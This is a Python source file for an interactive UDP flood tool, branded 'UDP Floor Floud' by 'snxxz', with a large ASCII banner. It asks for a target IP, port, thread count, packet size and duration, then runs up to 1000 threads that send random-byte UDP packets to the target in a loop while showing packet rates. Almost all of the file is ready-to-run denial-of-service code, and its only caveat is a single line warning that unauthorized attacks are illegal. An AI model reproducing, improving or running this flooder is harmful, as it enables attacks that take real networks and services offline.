import socket
import random
import time
import os
import threading
import sys
from datetime import timedelta

DEFAULT_PORT = 80
DEFAULT_THREADS = 50
DEFAULT_PACKET_SIZE = 1024
STATUS_UPDATE_INTERVAL = 0.5

COLOR = {
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
    "UNDERLINE": "\033[4m",
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "RGB_FG_PREFIX": "\033[38;2;",
    "RGB_BG_PREFIX": "\033[48;2;",
    "RGB_SUFFIX": "m",
}

def colored_text(text, color_name_or_code):
    if isinstance(color_name_or_code, str) and color_name_or_code.upper() in COLOR:
        return f"{COLOR[color_name_or_code.upper()]}{text}{COLOR['RESET']}"
    elif isinstance(color_name_or_code, (int, str)) and str(color_name_or_code).isdigit():
        return f"\033[{color_name_or_code}m{text}{COLOR['RESET']}"
    else:
        return f"\033[{color_name_or_code}m{text}{COLOR['RESET']}"

def rgb_text(text, r, g, b):
    return f"{COLOR['RGB_FG_PREFIX']}{r};{g};{b}{COLOR['RGB_SUFFIX']}{text}{COLOR['RESET']}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_banner(banner_text, start_color_rgb, end_color_rgb):
    lines = banner_text.strip('\n').splitlines()
    num_lines = len(lines)
    if num_lines == 0:
        return

    r1, g1, b1 = start_color_rgb
    r2, g2, b2 = end_color_rgb

    max_line_len = max(len(line) for line in lines)

    print("\n")
    for i, line in enumerate(lines):
        if num_lines > 1:
            ratio = i / (num_lines - 1)
            r = int(r1 + (r2 - r1) * ratio)
            g = int(g1 + (g2 - g1) * ratio)
            b = int(b1 + (b2 - b1) * ratio)
        else:
            r, g, b = r1, g1, b1

        padding = (max_line_len - len(line)) // 2
        centered_line = " " * padding + line
        print(rgb_text(centered_line, r, g, b))
    print("\n")

def print_separator(length=80, char='─', color="WHITE"):
    print(colored_text(char * length, color))

banner = r"""
   ▄████████  ▄█        ▄██████▄   ▄██████▄     ▄████████                        
  ███    ███ ███       ███    ███ ███    ███   ███    ███                        
  ███    █▀  ███       ███    ███ ███    ███   ███    ███                        
 ▄███▄▄▄     ███       ███    ███ ███    ███  ▄███▄▄▄▄██▀                        
▀▀███▀▀▀     ███       ███    ███ ███    ███ ▀▀███▀▀▀▀▀                          
  ███        ███       ███    ███ ███    ███ ▀███████████                        
  ███        ███▌    ▄ ███    ███ ███    ███   ███    ███                        
  ███        █████▄▄██  ▀██████▀   ▀██████▀    ███    ███                        
             ▀                                 ███    ███                        
   ▄████████  ▄█        ▄██████▄  ███    █▄  ████████▄     ▄████████    ▄████████
  ███    ███ ███       ███    ███ ███    ███ ███   ▀███   ███    ███   ███    ███
  ███    █▀  ███       ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███
 ▄███▄▄▄     ███       ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀
▀▀███▀▀▀     ███       ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀  
  ███        ███       ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████
  ███        ███▌    ▄ ███    ███ ███    ███ ███   ▄███   ███    ███   ███    ███
  ███        █████▄▄██  ▀██████▀  ████████▀  ████████▀    ██████████   ███    ███
             ▀                                                         ███    ███
                       >> UDP Floor Floud<<
"""

start_color_rgb = (100, 0, 200)
end_color_rgb = (255, 100, 200)

sent_packets = 0
start_time = 0
packet_lock = threading.Lock()
stop_event = threading.Event()

def get_validated_input(prompt, default_value, validation_type=int, min_value=None, max_value=None):
    while True:
        try:
            user_input = input(prompt)
            if not user_input:
                return default_value

            value = validation_type(user_input)

            if min_value is not None and value < min_value:
                print(colored_text(f"  Error: Value must be at least {min_value}.", "RED"))
                continue
            if max_value is not None and value > max_value:
                print(colored_text(f"  Error: Value must be no more than {max_value}.", "RED"))
                continue
            return value
        except ValueError:
            print(colored_text(f"  Error: Invalid input. Please enter a valid {validation_type.__name__}.", "RED"))
        except Exception as e:
            print(colored_text(f"  An unexpected error occurred: {e}", "RED"))

def validate_ip(ip_str):
    parts = ip_str.split('.')
    if len(parts) != 4:
        return False
    try:
        for item in parts:
            if not 0 <= int(item) <= 255:
                return False
        return True
    except ValueError:
        return False

def generate_random_ip():
    return f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"

def worker_flood(target_ip, port, packet_size):
    global sent_packets
    global packet_lock
    global stop_event

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as e:
        print(colored_text(f"\n[Thread Error] Socket creation failed: {e}", "RED"))
        return

    try:
        bytes_to_send = random._urandom(packet_size)
    except MemoryError:
         print(colored_text(f"\n[Thread Error] Memory error creating packet of size {packet_size}. Try smaller size.", "RED"))
         sock.close()
         return
    except Exception as e:
        print(colored_text(f"\n[Thread Error] Error generating random data: {e}", "RED"))
        sock.close()
        return


    while not stop_event.is_set():
        try:
            sock.sendto(bytes_to_send, (target_ip, port))
            with packet_lock:
                sent_packets += 1
        except socket.gaierror:
             print(colored_text(f"\n[Thread Error] Address-related error sending to {target_ip}. Is the IP valid?", "RED"))
             stop_event.set()
             break
        except socket.error as e:
            time.sleep(0.01)
            pass
        except Exception as e:
            print(colored_text(f"\n[Thread Error] Unexpected error in send loop: {e}", "RED"))
            time.sleep(0.01)
            pass

    sock.close()

def status_updater(target_ip, port, duration, packet_size, threads):
    global sent_packets
    global start_time
    global packet_lock
    global stop_event

    initial_start_time = start_time

    while not stop_event.wait(STATUS_UPDATE_INTERVAL):
        elapsed_time = time.time() - initial_start_time
        if elapsed_time <= 0:
            continue

        with packet_lock:
            current_packets = sent_packets

        pps = int(current_packets / elapsed_time)
        data_rate_mbps = (current_packets * packet_size * 8) / (elapsed_time * 1_000_000)

        remaining_time = duration - elapsed_time
        if remaining_time < 0:
            remaining_time = 0

        status_line = (
            f" {colored_text('Target:', 'CYAN')} {colored_text(target_ip, 'WHITE')}:{colored_text(str(port), 'WHITE')} |"
            f" {colored_text('Threads:', 'CYAN')} {colored_text(str(threads), 'WHITE')} |"
            f" {colored_text('PPS:', 'CYAN')} {colored_text(f'{pps:,}', 'GREEN')} |"
            f" {colored_text('Rate:', 'CYAN')} {colored_text(f'{data_rate_mbps:.2f} Mbps', 'GREEN')} |"
            f" {colored_text('Sent:', 'CYAN')} {colored_text(f'{current_packets:,}', 'WHITE')} |"
            f" {colored_text('Time:', 'CYAN')} {colored_text(str(timedelta(seconds=int(elapsed_time))), 'WHITE')} / {colored_text(str(timedelta(seconds=duration)), 'WHITE')} "
        )

        terminal_width = os.get_terminal_size().columns
        padding = " " * (terminal_width - len(status_line) + 30)
        print(f"\r{status_line}{padding}", end='')
        sys.stdout.flush()

    final_elapsed_time = time.time() - initial_start_time
    if final_elapsed_time <= 0: final_elapsed_time = 0.001

    with packet_lock:
        final_packets = sent_packets

    final_pps = int(final_packets / final_elapsed_time)
    final_data_rate_mbps = (final_packets * packet_size * 8) / (final_elapsed_time * 1_000_000)

    print("\r" + " " * os.get_terminal_size().columns + "\r", end='')

    print_separator(char='=', color="MAGENTA")
    print(f" {colored_text('Attack Finished!', 'BOLD')}")
    print(f"  Target:        {colored_text(target_ip, 'CYAN')}:{colored_text(str(port), 'CYAN')}")
    print(f"  Duration:      {colored_text(str(timedelta(seconds=int(final_elapsed_time))), 'YELLOW')} (Actual)")
    print(f"  Total Packets: {colored_text(f'{final_packets:,}', 'GREEN')}")
    print(f"  Packet Size:   {colored_text(f'{packet_size} bytes', 'WHITE')}")
    print(f"  Avg. PPS:      {colored_text(f'{final_pps:,}', 'GREEN')}")
    print(f"  Avg. Rate:     {colored_text(f'{final_data_rate_mbps:.2f} Mbps', 'GREEN')}")
    print_separator(char='=', color="MAGENTA")

def print_watermark():
    try:
        terminal_width = os.get_terminal_size().columns
    except OSError:
        terminal_width = 80 # default value if terminal size cannot be determined.
    watermark_text = "snxxz UDP Flooder"
    watermark = colored_text(watermark_text.rjust(terminal_width - 2), "CYAN") # Right-align and color the watermark
    print(watermark, end="")
    sys.stdout.flush()


if __name__ == '__main__':
    clear_screen()
    gradient_banner(banner, start_color_rgb, end_color_rgb)
    print_separator(color="MAGENTA")
    print(colored_text(" The code will be open source one day.", "YELLOW"))
    print(colored_text(" Unauthorized network attacks are illegal and unethical.", "RED"))
    print_separator(color="MAGENTA")

    while True:
        target_ip = input(f" {colored_text('>', 'MAGENTA')} Enter Target IP address: ")
        if validate_ip(target_ip):
            try:
                socket.gethostbyname(target_ip)
                break
            except socket.gaierror:
                print(colored_text(f"  Error: Could not resolve hostname/IP '{target_ip}'. Please check and try again.", "RED"))
            except Exception as e:
                 print(colored_text(f"  Error resolving IP: {e}", "RED"))
        else:
            print(colored_text("  Error: Invalid IP address format. (e.g., 192.168.1.1)", "RED"))

    port = get_validated_input(
        f" {colored_text('>', 'MAGENTA')} Enter Port (default: {DEFAULT_PORT}): ",
        DEFAULT_PORT, validation_type=int, min_value=1, max_value=65535
    )
    threads = get_validated_input(
        f" {colored_text('>', 'MAGENTA')} Enter Number of Threads (default: {DEFAULT_THREADS}): ",
        DEFAULT_THREADS, validation_type=int, min_value=1, max_value=1000
    )
    packet_size = get_validated_input(
        f" {colored_text('>', 'MAGENTA')} Enter Packet Size (bytes, default: {DEFAULT_PACKET_SIZE}): ",
        DEFAULT_PACKET_SIZE, validation_type=int, min_value=1, max_value=65500
    )
    duration = get_validated_input(
        f" {colored_text('>', 'MAGENTA')} Enter Duration (seconds): ",
        60, validation_type=int, min_value=1
    )

    print_separator(color="MAGENTA")
    print(f" {colored_text('Configuration:', 'BOLD')}")
    print(f"  Target IP:    {colored_text(target_ip, 'CYAN')}")
    print(f"  Target Port:  {colored_text(str(port), 'CYAN')}")
    print(f"  Threads:      {colored_text(str(threads), 'CYAN')}")
    print(f"  Packet Size:  {colored_text(str(packet_size), 'CYAN')} bytes")
    print(f"  Duration:     {colored_text(str(duration), 'CYAN')} seconds")
    print_separator(color="MAGENTA")
    input(f" {colored_text('Press Enter to start the flood or Ctrl+C to abort...', 'YELLOW')}")
    print(colored_text("\n Starting flood... Press Ctrl+C to stop early.", "GREEN"))

    thread_list = []
    start_time = time.time()

    for i in range(threads):
        thread = threading.Thread(target=worker_flood, args=(target_ip, port, packet_size), daemon=True)
        thread_list.append(thread)
        thread.start()

    status_thread = threading.Thread(target=status_updater, args=(target_ip, port, duration, packet_size, threads), daemon=True)
    status_thread.start()

    try:
        stop_event.wait(timeout=duration)
        print("\n" + colored_text("Duration reached. Stopping threads...", "YELLOW"))

    except KeyboardInterrupt:
        print("\n" + colored_text("Ctrl+C detected. Stopping threads...", "YELLOW"))

    finally:
        stop_event.set()

        status_thread.join()

    print(colored_text("Flood finished.", "GREEN"))
    print_separator(color="MAGENTA")
    print(f" {colored_text('UDP Floor Floud made by snxxz', 'WHITE')}")
    print_separator(color="MAGENTA")

